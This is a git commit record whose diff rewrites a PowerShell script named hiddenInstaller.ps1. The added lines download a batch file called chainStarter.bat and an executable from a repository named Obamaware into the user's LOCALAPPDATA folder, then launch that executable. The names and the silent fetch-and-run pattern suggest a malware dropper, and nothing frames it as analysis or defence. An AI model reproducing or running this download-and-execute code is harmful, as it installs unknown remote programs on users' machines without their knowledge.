40deb274a5cebe97e348fcab42c5f2fe2f8ff8c8
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2025-10-22 14:30:42 +0200

    Update hiddenInstaller.ps1 to download files

--- hiddenInstaller.ps1
+++ hiddenInstaller.ps1
@@ -1,1 +1,4 @@
-powershell.exe
+iwr 'https://raw.githubusercontent.com/RaupenInspektor/Pico/main/chainStarter.bat' -OutFile "$env:LOCALAPPDATA\start.bat"
+iwr 'https://raw.githubusercontent.com/RaupenInspektor/Obamaware/main/Install.exe' -OutFile "$env:LOCALAPPDATA\install.exe"
+
+Start-Process -FilePath "$env:LOCALAPPDATA\install.exe"
